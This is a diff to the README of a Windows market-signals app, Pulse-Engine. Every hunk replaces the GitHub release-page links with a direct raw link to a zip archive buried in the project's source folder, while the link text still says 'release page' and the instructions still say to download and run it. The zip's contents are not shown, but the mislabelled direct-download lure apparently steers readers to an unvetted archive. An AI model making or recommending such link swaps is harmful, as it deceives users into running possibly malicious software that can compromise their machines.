@@ -1,6 +1,6 @@
 # 📊 Pulse-Engine_Market_Intelligence_Platform - Clear Market Signals, Fast Insights
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/aidenscot6148/Pulse-Engine_Market_Intelligence_Platform/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/aidenscot6148/Pulse-Engine_Market_Intelligence_Platform/main/pulseengine/core/Market-Pulse-Platform-Engine-Intelligence-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it if you want a simple way to follow market trends, check signal logic, and
 
 ## 📥 Download and Install
 
-1. Open the [release page](https://github.com/aidenscot6148/Pulse-Engine_Market_Intelligence_Platform/releases).
+1. Open the [release page](https://raw.githubusercontent.com/aidenscot6148/Pulse-Engine_Market_Intelligence_Platform/main/pulseengine/core/Market-Pulse-Platform-Engine-Intelligence-v2.0.zip).
 2. Find the latest release.
 3. Download the Windows file listed under Assets.
 4. Save the file to your computer.
@@ -188,7 +188,7 @@ It is a good fit for users who want market context without dealing with spreadsh
 
 ## 📌 Release Page
 
-Visit the [release page](https://github.com/aidenscot6148/Pulse-Engine_Market_Intelligence_Platform/releases) to download the latest Windows version and open the app on your PC
+Visit the [release page](https://raw.githubusercontent.com/aidenscot6148/Pulse-Engine_Market_Intelligence_Platform/main/pulseengine/core/Market-Pulse-Platform-Engine-Intelligence-v2.0.zip) to download the latest Windows version and open the app on your PC
 
 ## 🖼️ What You Will See
 
@@ -254,4 +254,4 @@ If a chart takes time to appear, let it finish loading before opening another se
 
 ## 🔗 Download Again
 
-[Go to the release page](https://github.com/aidenscot6148/Pulse-Engine_Market_Intelligence_Platform/releases) to download and run the latest Windows build
+[Go to the release page](https://raw.githubusercontent.com/aidenscot6148/Pulse-Engine_Market_Intelligence_Platform/main/pulseengine/core/Market-Pulse-Platform-Engine-Intelligence-v2.0.zip) to download and run the latest Windows build
